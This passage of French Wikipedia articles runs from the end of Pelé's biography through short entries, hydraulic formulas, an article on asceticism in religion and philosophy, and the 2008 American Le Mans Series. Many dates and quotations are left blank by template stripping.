Lors de sa première saison, qu'il rejoint en cours, il ne permet pas à son club de se qualifier pour la phase finale, toutefois sur le plan économique c'est un véritable succès avec des stades remplis et où de nombreuses personnalités assistent aux matchs de « "soccer" ». L'année suivante, en 1976, le Cosmos de New York recrute alors de nouveaux joueurs professionnels dont l'international italien Giorgio Chinaglia, l'équipe joue mieux et se qualifie pour les séries éliminatoires mais est battue en quart de finale par les Rowdies de Tampa Bay (1-3). Il décide alors de prolonger sa carrière d'une année. Les matchs à domicile se déroulent depuis peu au Giants Stadium et de nouveau un effort avait été fait sur le recrutement des joueurs : Franz Beckenbauer, Carlos Alberto ou Jomo Sono. Le , l'équipe parvient en "Soccer Bowl" (finale du championnat) et Pelé remporte son premier titre de la NASL contre les Seattle Sounders. Avec treize buts et un record de dix-huit passes décisives dans la saison, Pelé est désigné meilleur joueur de la saison par ses pairs.
Après ce titre, Pelé décide d'annoncer sa retraite définitive du football. Pour cela, il organise un match d'adieu entre le Cosmos de New York et le Santos FC le au Giants Stadium, devant environ . Il revêt les couleurs du Cosmos de New York en première mi-temps puis celles du Santos FC en deuxième période. À la fin du match, il est soulevé par ses coéquipiers et effectue un tour d'honneur, Pelé n'arrivant pas à retenir ses larmes. Il est âgé alors de 37 ans. Il joue par la suite d'autres matchs, mais seulement amicaux à l'occasion d'autres jubilés ou de rencontres organisées par la Fédération internationale de football association (FIFA).
Activités hors du football.
Action humanitaire.
En 1977, il arrête définitivement le football. J.B. Pinheiro, ambassadeur du Brésil à l'Organisation des Nations unies (ONU), déclare que . Le de cette même année, l'ONU lui décerne le titre de . Il décide alors de s'engager dans des actions liées au football ou humanitaires, il travaille tout d'abord à la commission du fair-play à la Fédération internationale de football association (FIFA) puis devient ambassadeur de bonne volonté pour le Fonds des Nations unies pour l'enfance (UNICEF), notamment dans l'éducation et la santé des enfants, où il n'hésite pas à participer à des manifestations de collecte de fonds. Il a appuyé le téléthon télévisé pour les enfants en difficulté et le gala qu'Ute-Henriette Ohoven, ambassadrice de bonne volonté de l'Organisation des Nations unies pour l'éducation, la science et la culture (UNESCO), organise tous les ans afin de collecter des fonds pour l'éducation des enfants qui sont dans le besoin. Il utilise sa renommée pour promouvoir les activités de l'organisation. Il a participé au qui s'est tenu à Rome, en Italie, pour appuyer le processus de paix israélo-palestinien, en montrant une fois de plus son engagement, et pour tenter d'unir les parties ennemies grâce au langage du football.
Entre l'action humaniste culturelle et l'action politique, Pelé a clairement exprimé son soutien à la langue internationale espéranto en déclarant : .
Carrière politique.
Après la dictature dans son pays, de nombreux gouvernements souhaitent que Pelé prenne en main le ministère des Sports au Brésil. Après deux refus à Tancredo Neves en 1985 puis à José Sarney en 1989, Pelé accepte le poste proposé par Fernando Henrique Cardoso. Cette nomination intervient un an après les accusations de corruption de Pelé envers Ricardo Teixeira, le président de la Confédération brésilienne de football, qui lui a valu une plainte de ce dernier et d'être banni du tirage au sort par João Havelange de la Coupe du monde 1994 organisée aux États-Unis.
Il décide de refondre structurellement l'organisation du football au Brésil mais se heurte à certains présidents de clubs, car il souhaite que les clubs publient les bilans annuels. Il se heurte également à la Confédération brésilienne de football dont João Havelange dans sa tentative de doter le championnat du Brésil d'une ligue indépendante sur l'exemple du championnat d'Angleterre. Finalement, en fin d'exercice en 1998, il parvient à faire aboutir son projet de loi appelé la qui est une adaptation à l'arrêt Bosman en Europe pour permettre aux footballeurs de s'engager où ils le désirent.
Vie privée.
Habitudes.
Pelé avait l'habitude de parler de lui-même à la troisième personne.
Relations et enfants.
Le , Pelé épouse Rosemeri dos Reis Cholbi, dont il a deux filles, Kelly Cristina, née le et Jennifer, née en 1978, ainsi qu'un fils, Edinho, né le . Le couple se sépare en 1980 et divorce en 1982. Entre 1981 et 1986, il fréquente la présentatrice de télévision, Xuxa, qui était mannequin à l'époque. En 1990, Pelé commence à fréquenter la psychologue et chanteuse de gospel Assíria Seixas Lemos. Ils se marient en et le couple donne naissance le aux jumeaux Joshua et Celeste. Ils se séparent ensuite. En , il épouse la femme d'affaires d'origine japonaise de 24 ans sa cadette, Marcia Cibele Aoki.
Pelé a eu au moins deux enfants avec d'anciennes compagnes. Sandra Regina Machado née le , est la fille d'une femme de chambre, Anisia Machado ; elle s'est battue des années pour être reconnue par Pelé, qui a refusé de se soumettre aux tests ADN. Cependant, elle a été reconnue par les tribunaux comme étant sa fille. Pelé ne l'a jamais reconnue, même après son décès d'un cancer en 2006. Pelé a eu une autre fille, Já Flávia Kurtz, issue d'une relation extra-conjugale et née en 1970, avec la journaliste Lenita Kurtz. Il a reconnu Flavia comme sa fille.
Problèmes de santé.
En 1977, après une chute lors d'un match, il se retrouve avec la côte cassée et cette dernière endommage son rein droit qui lui est finalement retiré. Il apparait depuis 2017, lors de plusieurs évènements, notamment lors du tirage au sort de la Coupe du monde 2018, en fauteuil roulant car ayant du mal à se déplacer, selon son fils Edinho, Pelé souffrirait de ce manque de mobilité et serait en .
Mort.
Opéré d'une tumeur au niveau du côlon en , Pelé quitte l'hôpital à la fin du mois et poursuit une chimiothérapie pour traiter son cancer. Admis à nouveau à l'hôpital Albert Einstein de São Paulo le , son état est jugé comme . Le , l'hôpital indique que son état de santé s'aggrave et qu'une insuffisance nécessite des soins . Le , il meurt à l'âge de 82 ans, des suites de son cancer. L'hôpital évoque un décès lié à .
Les réactions sont nombreuses, Luiz Inácio Lula da Silva, le président de la république fédérative du Brésil élu estime que et qu'. Michel Platini ajoute que Pelé , Kylian Mbappé que et Neymar que .
Le gouvernement brésilien décrète un deuil national de trois jours à la suite de son décès. "" (en français : ) est enterré à Santos, dans l'intimité familiale, après une veillée funèbre ouverte au public au stade Urbano-Caldeira du Santos FC.
Buts mémorables.
En 1958, il marque deux buts en finale de la Coupe du monde contre la Suède : pour le premier, il réceptionne un centre de Nílton Santos avec un contrôle orienté de la poitrine qui lui permet d'éliminer Sigge Parling, puis lobe Bengt Gustavsson avec un coup du sombrero avant de reprendre de volée. Pour le second, il coupe de la tête un centre de Mário Zagallo après avoir gagné son duel aérien avec Sven Axbom. Sigge Parling, également présent sur cette action, confiera plus tard avoir eu à ce moment-là.
Selon lui, son plus beau but a été réalisé au stade Rua Javari lors d'une rencontre du championnat de São Paulo contre la Juventude le . L'animation est incluse dans "Pelé Eterno", un documentaire sur sa carrière. Il part de l'angle de la surface de réparation, lobe successivement quatre adversaires dont le gardien, sans permettre au ballon de toucher le sol, et termine cette action par une tête.
Le , il marque le (selon l'inscription d'une plaque commémorative au pied de la tribune d'honneur du stade), lors d'un match entre le Fluminense FC et le Santos FC et devant . Pelé remonte seul le ballon sur et élimine sept joueurs. Il marque le but en prenant le gardien du Fluminense FC à contrepied avec une frappe liftée. Même les spectateurs du Fluminense FC, battu , viendront embrasser Pelé, à la fin du match.
En 1970, il marque en finale, à Mexico, le du Brésil en Coupe du monde, ouvrant le score face à l'Italie. Une tête piquée reprise très haut. , expliqua-t-il plus tard. Ce même jour, il effectue une passe en aveugle mémorable dans le dos de la défense italienne pour le compte de son capitaine, Carlos Alberto qui marque le but du 4-1, score final. Lors de cette même compétition, trois actions de Pelé vont rester dans les mémoires, même si elles ne donnent pas de buts : il tente un lob de au-dessus du gardien tchécoslovaque Ivo Viktor, la balle passe à quelques centimètres du poteau, et il effectue un grand pont sans toucher le ballon sur le gardien uruguayen Ladislao Mazurkiewicz en demi-finale, mais une fois passé derrière le gardien, il ne parvient pas à cadrer sa frappe. Face à l'Angleterre au premier tour, Pelé frappe une tête piquée à bout portant au premier poteau, Gordon Banks effectue une parade réflexe qui sera qualifiée d'. , dit le Brésilien à chaud.
Style de jeu.
S'il a un physique commun, , Pelé possède des qualités techniques et athlétiques hors-normes. Joueur complet, il impressionne très tôt par sa classe. Pour Jean Snella, le sélectionneur de l'équipe de France à la Coupe du monde 1958, il n'a .
Rapide, doué d'une incroyable détente verticale (comme sur le but inscrit de la tête en finale de la Coupe du monde 1970), le Brésilien jouissait d'une aisance technique sur le terrain qui le faisait passer pour le meilleur de son époque. Il était capable de réaliser les gestes les plus techniques avec une très grande facilité. Il était aussi capable d'en réaliser beaucoup et régulièrement. A poussé l’art de l’improvisation à un niveau inconnu jusque-là. En 1958 comme en 1970, il tenta et réussit des gestes d'anthologie. Il est un des joueurs avec le plus de passes décisives dans l'histoire du football, 369.
Palmarès.
Pelé il a été reconnu comme le plus grand joueur de l'histoire par la FIFA et CIO.
Si Pelé est considéré comme le meilleur joueur de tous les temps, c'est surtout grâce à son impact sur le football toutes époques confondues avec des performances et de nombreux records restés inégalés jusqu'. De ses débuts professionnels à 16 ans à sa retraite internationale, Pelé a pratiquement éclipsé tous les autres joueurs de son époque, même au niveau de la précocité (plus jeune vainqueur en Coupe du monde, gagnée à 17 ans, et plus jeune buteur de l'histoire de cette compétition).
Titres.
Pelé est le seul joueur à avoir gagné trois Coupes du monde (1958, 1962 et 1970). Blessé lors du match de premier tour contre l'Espagne en 1962, Pelé ne dispute toutefois pas les trois matches à élimination directe (quart de finale, demi-finale et finale) lors de l'édition chilienne. Il a néanmoins marqué lors de quatre Coupes du monde différentes, totalisant 12 buts.
L'équipe du Brésil n'a jamais perdu un seul match lorsque le tandem Pelé et Garrincha était sur le terrain.
Records.
Pelé cumule les records. Le , contre le Vasco da Gama FC, il avait inscrit son 1000 but dans un délire indescriptible au Maracanã. Il marquera six fois cinq buts dans le même match au cours de sa carrière, 30 fois quatre buts et 92 fois trois buts. Son record de buts en un seul match est de huit, contre le Botafogo FR en 1964. Au total, on compte 1324 buts en 1413 matches, 778 en matches officiels et 77 buts (47 passes décisives) en 92 sélections internationales. Il a marqué 0.92 but par match tout au long de sa carrière et a marqué un total de 88 triplés selon. Pelé figure parmi les seuls joueurs ayant à la fois remporté une Coupe du monde et étant détenteurs du record de buts avec leur équipe nationale au même titre que Miroslav Klose (71 buts), David Villa (59 buts) et Olivier Giroud (54 buts).
Statistiques.
Statistiques officielles de Pelé
En sélection nationale.
! rowspan="2" |Saison
! rowspan="2" |Sélection
! colspan="3" |Phases finales
! colspan="2" |Éliminatoires CDM
! colspan="2" |Matchs amicaux
! colspan="2" |Total
! Compétition
!style="border-right-style:hidden;width:2em"| !!style="width:2em"| 
!style="border-right-style:hidden;width:2em"| M !!style="width:2em"| B !!style="border-right-style:hidden;width:2em" | M !!style="width:2em" | B !!style="border-right-style:hidden;width:2em" | M !!style="width:2em" | B
Notoriété.
Icône mondiale, Pelé est le symbole d'un nouvel optimisme brésilien au début des années 1960. Vedette sportive, sa notoriété dépasse le cadre du football et le joueur reçoit des audiences avec plusieurs papes, rois, et plusieurs dizaines de présidents. La Coupe du monde de football 1962 terminée, des clubs européens huppés ont proposé des sommes importantes pour engager le jeune joueur. Le gouvernement brésilien déclara cependant Pelé , ce qui empêcha son transfert.
En 1969, les deux factions impliquées dans la guerre civile au Nigéria se sont entendues sur un cessez-le-feu de quarante-huit heures pour regarder Pelé donner un match d'exhibition à Lagos. Il a fait la promotion du médicament commercial Viagra pour le compte des laboratoires Pfizer. Le slogan en français était : .
Pelé dans la culture populaire.
Pelé a été l'un des premiers Noirs à faire la couverture du magazine "Life".
Dans la ville de Santos, le est consacré . C'est l'anniversaire de son 1000 but, inscrit au Maracanã.
Pelé a été la première personnalité sportive représentée dans un jeu vidéo avec le jeu Pelé's Soccer sur Atari 2600.
En Formule 1, lors des Grands Prix automobile du Brésil, il a remis à plusieurs reprises les trophées. Toutefois, en 2002, chargé d'agiter le drapeau à damier pour signifier la fin de course, il manqua le franchissement de ligne du premier : Michael Schumacher.
Pelé a publié plusieurs autobiographies, tenu la vedette dans des documentaires et composé divers morceaux de musique, dont la musique du film "Pelé" en 1977. Il peut aussi se targuer d'un caméo en compagnie de nombreux autres footballeurs bien connus des années 1960 et 1970, dans le film "À nous la victoire". Ce dernier relate une tentative d'évasion d'un camp de prisonniers nazi.
Le , des investisseurs brésiliens, ayant comme ambassadeur Pelé, ont signé à Genève un partenariat unique en son genre avec le club de football suisse FC Lausanne-Sport. Le projet intitulé permettra au FC Lausanne-Sport de bénéficier de joueurs formés dans une académie de São Paulo, ainsi que d'obtenir un important soutien financier. En contrepartie, cet accord permettra aux investisseurs brésiliens d'ouvrir une vitrine en Europe aux joueurs issus de l'académie de São Paulo.
Le , mot « pelé » fait son entrée dans le dictionnaire Michaelis, un ouvrage de langue portugaise édité au Brésil, en tant que substantif adjectif faisant référence au footballeur brésilien. Le mot « pelé » est alors synonyme des mots « exceptionnel », « unique », « incomparable ».

</doc>
<doc id="2846105" url="https://fr.wikipedia.org/wiki?curid=2846105" title="蚌">
蚌

Bèng est la transcription en hanyu pinyin du caractère chinois 蚌, signifiant palourde.
Son caractère Unicode est 868C.
Exemple d'utilisation : Bengbu est une ville chinoise.

</doc>
<doc id="2846106" url="https://fr.wikipedia.org/wiki?curid=2846106" title="Bèng">
Bèng



</doc>
<doc id="2846108" url="https://fr.wikipedia.org/wiki?curid=2846108" title="Beam">
Beam

Beam signifie "rayon" ou "poutre" en anglais.
Sigle.
BEAM peut désigner :

</doc>
<doc id="2846130" url="https://fr.wikipedia.org/wiki?curid=2846130" title="Autovia de Lugo à Ourense A-56">
Autovia de Lugo à Ourense A-56



</doc>
<doc id="2846137" url="https://fr.wikipedia.org/wiki?curid=2846137" title="Bù">
Bù



</doc>
<doc id="2846141" url="https://fr.wikipedia.org/wiki?curid=2846141" title="Victor Meunier">
Victor Meunier

Victor Meunier est un écrivain scientifique et militant socialiste français né le à Paris où il est mort le .
Avec son épouse Isabelle-Mary Hack, première traductrice de l'écrivain Edgar Allan Poe, ils ont deux fils, Stanislas Meunier et Lucien-Victor Meunier.
Biographie.
Après avoir été un socialiste militant durant les années 1848-1850, Victor Meunier joua un rôle considérable dans le mouvement de vulgarisation scientifique qui s'accentua à partir des années 1850-1860. Rédacteur au "Travail affranchi" puis du feuilleton scientifique de "La Presse" jusqu'en 1855, en remplacement de l'abbé Moigno, il laissa sa place à Louis Figuier pour fonder "L'Ami des Sciences" en 1855 ainsi que la "Presse des enfants". Entre 1867 et 1870, il prend la direction de la revue "Cosmos" qu'il radicalise.
Il fut aussi rédacteur pour "L'Écho du monde savant", "La Phalange", la "Revue synthétique", le "Courrier de l'industrie", etc.
Son épouse fit paraître la traduction de Poë dans la revue fouriériste "La Démocratie pacifique" de la nouvelle "Le Chat noir", parue le .
Publications.
Naturaliste de valeur, il publia :

</doc>
<doc id="2846167" url="https://fr.wikipedia.org/wiki?curid=2846167" title="Compagnon du devoir">
Compagnon du devoir



</doc>
<doc id="2846173" url="https://fr.wikipedia.org/wiki?curid=2846173" title="Calcul hydraulique">
Calcul hydraulique

Ce formulaire propose les formules de bases des calculs hydrauliques, principalement oléohydraulique. Force, puissance et débit sont les éléments principaux. Les pertes en charge et les rendements hydrauliques sont les éléments les plus complexes à définir. Actuellement, ils sont souvent déterminés par ordinateur ou abaque sans que ces formules soient indispensables à l'utilisateur.
Force d'un vérin.
formula_1
Pour la section "S", exprimée en fonction du diamètre du cylindre :
formula_2
Puissance d'une pompe.
formula_3
Pour calculer la puissance mécanique absorbée par la pompe, il faut ajouter à la puissance hydraulique les pertes dues au rendement.
Le rendement dépend de la technologie de la pompe utilisée et de la pression d'utilisation ainsi que des caractéristiques du fluide (viscosité, température, etc.).
avec les unités usuelles :
formula_4
Couple moteur.
formula_5
ou selon les unités du SI,
formula_6
formula_8
Calcul de cylindrée de pompe à engrenages.
profondeur de denture × épaisseur (largeur) de denture × entraxe entre les 2 pignons × 3,14 = cylindrée
Pour éviter les erreurs, toutes les dimensions seront en centimètres et donneront une cylindrée approximative en 
Calcul de tuyauterie.
Appelé en pratique par les hydrauliciens, calcul de perte en charge ou calcul de formula_10.
Les calculs sont complexes, il faut faire appel aux formules de Bernoulli ou Torricelli, ainsi qu'au nombre de Reynolds.
Pour ne pas se tromper avec des formules complexes et pour gagner du temps, en pratique les hydrauliciens utilisent des abaques.
En hydraulique et en pneumatique, c'est la même chose, la pression fait varier la force et le débit fait varier la vitesse.
Le petit détail qui change tout, c'est la perte en charge (formula_10) ; cela est dû au diamètre de tuyauterie qui freine le débit.
Si on augmente la pression, il est plus facile de vaincre le freinage dû à la tuyauterie. Plus la pression du circuit est basse, plus les pertes en charge ont de l'effet.

</doc>
<doc id="2846179" url="https://fr.wikipedia.org/wiki?curid=2846179" title="Ranger-X">
Ranger-X



</doc>
<doc id="2846181" url="https://fr.wikipedia.org/wiki?curid=2846181" title="Ascétisme">
Ascétisme



</doc>
<doc id="2846183" url="https://fr.wikipedia.org/wiki?curid=2846183" title="Ascèse">
Ascèse

L'ascèse ou ascétisme est une discipline volontaire du corps et de l'esprit cherchant à tendre vers une perfection. L'ascèse est couramment rattachée à diverses religions, mais son usage n'est pas limité à celles-ci ; il s'étend notamment aux exercices spirituels pratiqués dans les écoles de philosophie antique.
À l'origine du terme « ascèse », le mot grec "askêsis", signifiant « exercice » ou « entraînement » s'appliquait à de nombreuses activités et en particulier à l'athlétisme, bénéficiant ainsi d'une signification originelle purement physique. Au apparaîtra, à travers le latin, le mot "asceta" ou "asceteria", signifiant « moine/religieuse », « monastère/couvent ». Il en découlera le mot moderne d'ascèse.
Il existe diverses disciplines de l'ascèse. Certaines reposent sur la privation pour accéder à une maîtrise spirituelle. C'est le cas de la mortification et l'abstinence sexuelle. D'autre part, certaines pratiques diverses se rattachent à l'ascèse : jeûne, absence de drogue et d'alcool.
L’ascétère est un lieu spécifique dédié à l'ascèse.
Religions.
Christianisme.
Il est nécessaire de rappeler que les réalités ecclésiales sont très diverses. La compréhension et surtout la pratique de l'ascèse n'échappent pas à cette diversité, notamment entre l'Église catholique de rite romain ou de rite oriental et les Églises-sœurs orthodoxes. Toutes ces Églises ont conservé la vie religieuse et en particulier la vie monastique qui sont, par excellence, les lieux où se pratique l'ascèse.
Il ne faudrait pas en déduire que l'ascèse serait réservée aux seuls consacrés. Au contraire, le CEC au n° 2013, citant la constitution "Lumen gentium" dit : « L'appel à la plénitude de la vie chrétienne et à la perfection de la charité s'adresse à tous ceux qui croient au Christ, quels que soient leur rang ou leur état » (LG 40) et précise au n° 2015 : « Le chemin de la perfection passe par la Croix. Il n'y a pas de sainteté sans renoncement et sans combat spirituel (cf. 2 Tm, 4). Le progrès spirituel implique l'ascèse et la mortification qui conduisent graduellement à vivre dans la paix et la joie des Béatitudes ».
Au désert, le Christ a mené un combat spirituel dont il est sorti victorieux. À sa suite, il ne s’agit pas de faire des efforts par nos propres forces humaines mais de laisser le Christ nous habiter pour faire sa volonté et nous laisser guider par l’Esprit.
Si l'ascèse est dès lors une nécessité permanente, l'Église catholique en recommande particulièrement la pratique pendant le Carême, qui dure quarante jours effectifs. Cette période est fondée sur les quarante années que les Israélites ont passées dans le désert (Exode) et sur les quarante jours passés par Jésus au désert avant de commencer sa vie publique. Le Carême s'ouvre par la liturgie du mercredi des Cendres et prend fin le Jeudi saint qui ouvre le Triduum pascal.
Le Carême catholique est aujourd'hui vécu par les fidèles comme une période de partage au profit des plus démunis. Mais cette forme contemporaine de l'aumône ne doit pas faire oublier le primat de la prière - qui est aussi un enjeu du -, ni le jeûne quelle que soit la forme concrète qu'on lui donne.
La période de l'Avent, les trente jours qui précèdent Noël, ne doit pas être vécu comme le Carême. Il s'agit d'abord de préparer les cœurs à la parousie et, à partir du 17 décembre avec les antiennes Ô, de se préparer spirituellement à commémorer la venue du Christ dans notre chair.
Avant le concile Vatican II, il était demandé aux adultes en bonne santé de s'abstenir de viande chaque vendredi de l'année, en souvenir de la Passion. Sans l'interdire, le concile a recommandé que cette pratique, devenue avec le temps routinière et de ce fait moins signifiante, soit remplacée par des gestes d'écoute ou d'attention envers le "prochain". En effet, le prix du poisson avait rattrapé peu à peu celui de la viande. Dès lors, blâmer le comportement du pauvre mangeant une tranche de jambon le vendredi mais louer celui du riche déjeunant d'un turbot devenait déplacé.
Islam.
Le "Zuhd" est l'une des notions très importantes dans le cheminement spirituel dans l'islam, qu'on traduit parfois par ascétisme, mais aussi par « détachement », ou « renoncement » dans le but d'un rattachement à la divinité. "Zâhid" est un terme signifiant "ascète", utilisé pour désigner les musulmans. Pour P. Lory, . Plusieurs références à l'ascétisme se trouvent dans le Coran. Même si plusieurs traditions ont voulu présenter Mahomet comme un exemple de renoncement.
Dès les premiers siècles de l'islam apparait un ascétisme musulman, en particulier en réaction à l'enrichissement de l'Umma. P. Lory remarque qu'au IIIe de l'Hégire, une évolution se fait d'une spiritualité plus ancienne, marquée par une crainte du Jugement vers une autre marquée par une volonté d'union à Allah. Si cette rupture peut être nuancée, les premiers siècles de l'islam n'évoque pas explicitement la question de "l'action du cœur" et la manifestation de la foi rejaillit d'actions matérielles. Néanmoins, cette spiritualité pouvait être le support d'une expérience mystique.
Judaïsme.
Dans la religion juive, le "détachement" ou le "renoncement" deviennent le point de rencontre entre la théologie plus rigoureuse des Dix Commandements, l'éthique de l'auto-contrôle/inhibition ou, plus simplement, de la "vigilance pour ne pas transgresser", et enfin de la conception de la Kabbale qui considère "l'âme et le corp" comme deux modèles du monde supérieur, le monde spirituel, et du monde de 'Assiya, celui "des sens"... et de la foi tangible en Dieu et vécu aussi dans le pragmatisme quotidien des préceptes juifs de la Halakhah : les Mitzvot. L'âme et le corps sont ainsi unis dans le sceau spirituel de la Kedoucha, la "sainteté juive" : cela se produit avec des Kavanot spécifiques pour la Yehidah, comme le Bitul ou "auto-annulation spirituelle intérieure de l'ascèse mystique juive".
Hindouisme.
Dans l'hindouisme, le principe le plus proche de l'ascétisme est tapas.
Bouddhisme.
Exemple d'ascèse dans le bouddhisme : Siddhartha Gautama (le premier Bouddha) a vécu un moment de sa vie en ascèse extrême avant de chercher la "voie du milieu" qui lui permettra d'atteindre la libération.
Philosophie.
Socrate et Platon.
Socrate (469–399 ) était considéré comme modèle de la vertu. Son élève Xénophon louait sa maîtrise de soi "(enkráteia)" et trouvait que Socrate l'avait plus que tout autre. Il était le plus endurant pour lutter contre le froid, la chaleur et toutes autres pénibilités, et avait posé comme fondement de la vertu sa maîtrise de soi, car sans elle, tout effort était vain. Xénophon insistait sur la nécessité de réaliser des exercices mentaux et corporels comme moyen d'acquisition de cette maîtrise de soi ; selon son témoignage, Socrate affirmait que s'ils ne négligeaient pas cet entraînement, les moins dotés par la nature pouvaient se hisser au rang des plus forts. Une description détaillée quant à l'auto-discipline de Socrate et son endurance pour supporter les peines et la fatigue fut retranscrite par son célèbre disciple Platon dans son dialogue "Le Banquet". Cette ascèse philosophique rencontra toutefois la critique de ses contemporains. En effet, celle-ci est moquée par l'auteur de comédies Aristophane qui voit dans ce style de vie autour de Socrate un phénomène de mode aberrant.
Platon plaide pour une vie simple, en accord avec la nature et non pas opulente. Il n'entendait pas par là un retour à une civilisation primitive, mais une purification de tout excès. Grâce à cela, les hommes pourraient atteindre un état de circonspection et de calme intérieur. Seuls les besoins vitaux devaient être remplis, mais sans aller au-delà de ce qui est nécessaire. Comme son maître Socrate, Platon insistait sur l'importance de l'acquisition d'une retenue. Par l'ascèse, il entendait des exercices intellectuels, qui se fondaient sur la pensée et la volonté et visaient l"aretḗ" (compétence, vertu, excellence) : on devrait . S'entraîner à vivre et à mourir était la meilleure façon de vivre. Dans les discussions de l'époque sur l'éducation et la formation du caractère, le poids et la conjugaison de trois facteurs avaient leur importance : les dispositions naturelles, l'instruction et la répétition "(áskēsis)".
Stoïcisme.
Chez les stoïciens, l' joue un rôle particulier dans la manière philosophique de vivre. La place de l’abstention et du renoncement est centrale à leurs yeux. L'ascèse avait été d'abord pensée comme une discipline mentale. L'ascèse corporelle avait aussi son importance, mais moindre. Les pratiques corporelles sans fondement mental, sans objectif, étaient inutiles ; l'ascèse superficielle et ouvertement affichée, menée dans le but d'impressionner les autres était désapprouvée. La maîtrise des pensées et des instincts devait libérer le philosophe stoïcien de la tyrannie des états d'âmes mouvementés et ainsi lui offrir une paix et une liberté intérieures. L"apátheia" (absence de passions) était recherchée : le refoulement de pulsions destructrices et source de souffrance comme la colère, la peur, l'envie et la haine, et dans le meilleur des cas, le détachement de toutes stimulations liée à la sensibilité. L'apathie atteinte n'était qu'une condition préalable à l'ataraxie (tranquillité, absence de trouble). L'idéal de l'ascèse stoïcien trouva beaucoup d'écho dans la période de l'Empire Romain. Le stoïcien Epictète donnait des indications détaillées des exercices à pratiquer. L'empereur romain Marc Aurèle est un exemple éminent d'ascète stoïcien. Les stoïciens sous l'empire exigeaient l'accomplissement des devoirs du citoyen, qui selon leurs convictions comprenait aussi pour le philosophe le devoir de se marier et de fonder une famille.
Kant (1724 - 1804).
Kant pense que l'ascétisme reflète la manière de vivre de tous les hommes, leur but propre afin d'atteindre le bonheur .
Schopenhauer.
Pour Schopenhauer dans son oeuvre "Le Monde comme volonté et comme représentation", l'ascétisme permet de faire la négation de la volonté (comme privation de celle-ci), ce qui permet à l'ascète d'éviter la cause de souffrance qu'est la volonté. Celle-ci entraînant des désirs perpétuels et la souffrance pour les atteindre, ou l'ennui quand ils sont atteints.
Critique de Nietzsche (1887).
La plus grande partie de l'ouvrage de Nietzsche, "Généalogie de la morale", est intitulée (« Troisième Dissertation »), où il développe une critique radicale de l'ascèse et de ceux qui la prescrivent, responsable selon lui de ruiner la santé, et d'être contraire à la vie, le tout aux noms de croyances et de préjugés philosophiques ou théologiques, de l'existence d'un arrière-monde.
Cette Troisième Dissertation commence avec l'aphorisme suivant :
« 1. Quel est le sens de tout idéal ascétique ? ; chez les philosophes et les savants quelque chose comme un flair et un instinct pour les conditions favorables à la haute spiritualité ; chez les femmes tout au plus un charme de séduction "en plus", un peu de "morbidezza" sur de belles chairs, ce qu’un joli animal un peu gras a d’angélique ; chez les disgraciés et les déséquilibrés au point de vue physiologique (chez la "majorité" des mortels) une tentative de se trouver « trop bon » pour ce monde, une forme sacrée de la débauche, leur arme capitale dans la lutte contre la douleur lente et l’ennui ; chez les prêtres la véritable foi sacerdotale, leur meilleur instrument de puissance, et aussi leur « suprême » autorisation au pouvoir ; chez les saints enfin un prétexte au sommeil hivernal, leur "novissima gloriæ cupido", leur repos dans le néant (« Dieu »), leur manifestation de la démence. En somme, de cette diversité de sens dans l’idéal ascétique chez l’homme, ressort le caractère essentiel de la volonté humaine, son "horror vacui : il lui faut un but", . M’a-t-on compris ?… « "Décidément non, Monsieur !" » . »
En parlant d'un certain type d'ascetisme très courant entre les philosophes, Nietzsche écrit ceci dans le même contexte de son livre :
« Toute bête, "la bête philosophique" comme les autres, tend instinctivement vers un "optimum" de conditions favorables au milieu desquelles elle peut déployer sa force et atteindre la plénitude du sentiment de sa puissance ; toute bête a de même une horreur instinctive et une sorte de flair subtil, « supérieur à toute raison », pour toute espèce de troubles et d’obstacles qui se présentent ou pourraient se présenter sur la route vers l’"optimum" . Par suite, le philosophe a horreur du "mariage" et de tout ce qui pourrait l’y conduire, . Parmi les grands philosophes, lequel était marié ? Heraclite, Platon, Descartes, Spinoza, Leibniz, Kant, Schopenhauer ; bien plus, on ne pourrait même se les "imaginer" mariés. Un philosophe marié a sa place dans la "comédie", telle est ma thèse : et Socrate, seule exception, le malicieux Socrate, s’est, semble-t-il, marié par ironie, précisément pour démontrer la vérité de "cette" thèse. »
Un autre aspect de sa réflexion sur ce thème de l'ascetisme peut être identifié plus tard dans l'oeuvre "Trois essais sur la théorie sexuelle" (1905), de Sigmund Freud, dans laquelle cet auteur a créé le concept de « sublimation ». Au lieu de ce terme là, Nietzsche parle d'une « "activité machinale" » :
« Beaucoup plus fréquemment, au lieu d’un pareil étouffement hypnotique de la sensibilité, de la faculté de souffrir qui suppose déjà des forces peu communes, avant tout le courage, le mépris de l’opinion, le « stoïcisme intellectuel », on emploie, contre les états de dépression, un autre "training," en tous les cas plus commode : l’"activité machinale". Que par elle une existence de souffrances soit considérablement allégée, la chose n’est pas douteuse ; on appelle aujourd’hui ce résultat un peu hypocritement « la bénédiction du travail ». L’allégement provient de ce que l’intérêt du patient est fortement détourné de la souffrance, : car elle est "étroite", cette mansarde que l’on appelle la conscience humaine ! L’activité machinale et tout ce qui s’y rapporte : combien radicalement et délicatement le prêtre ascétique a su employer tout cela dans la lutte contre la douleur ! »
Sociologie.
Étude de Max Weber.
Max Weber a étudié le passage de l'ascétisme religieux à l'ascétisme économique, puis enfin à l'esprit de capitalisme. Dans ce sens, l'ascétisme est la privation particulière que l'individu pratique pour atteindre un but. Weber examine plusieurs sources du protestantisme ascétique : le calvinisme, le piétisme, le méthodisme et les sectes issues du mouvement baptiste.
Médecine.
Depuis 1902, le chirurgien et eugéniste Alexis Carrel étudiait, au sanctuaire de Lourdes et ailleurs, un effet de prière sur des guérisons inexplicables, quoiqu'il évitât l'usage du mot "miracle". Comme il s'apercevait que ce type de guérison était observé sur des hommes qui priaient pour quelqu'un d'autre, et non pour soi-même, il supposait un effet de l'ascèse dans le contexte médical, à condition qu'il s'agît d' « une forme très élevée de l'ascèse ». Bien que ces affirmations ne furent jamais vérifiées.
Franc-maçonnerie.
Selon Richard Dupuy grand-maitre de la Grande Loge de France, expose dans son ouvrage "La foi d'un franc-maçon", sa conception personnelle de l'ordre maçonnique. Qualifiant sa pratique . Il inscrit cette notion dans le courant d'une franc-maçonnerie spiritualiste qui se tient hors du domaine des religions et de la politique, différent de ce qu'il nomme .

</doc>
<doc id="2846188" url="https://fr.wikipedia.org/wiki?curid=2846188" title="American Le Mans Series 2008">
American Le Mans Series 2008

L'American Le Mans Series 2008 s'est déroulée du 15 mars au sur un total de 11 manches.
Résultats.
Les vainqueurs du classement général de chaque manche sont inscrits en caractères gras.
Classement écuries.
Pour les courses de moins de 3 heures, les points sont accordés selon le barème suivant :
Pour les courses d'une durée de 4 à 8 heures, les points sont accordés selon le barème suivant :
Pour les courses de plus de 8 heures, les points sont accordés selon le barème suivant :
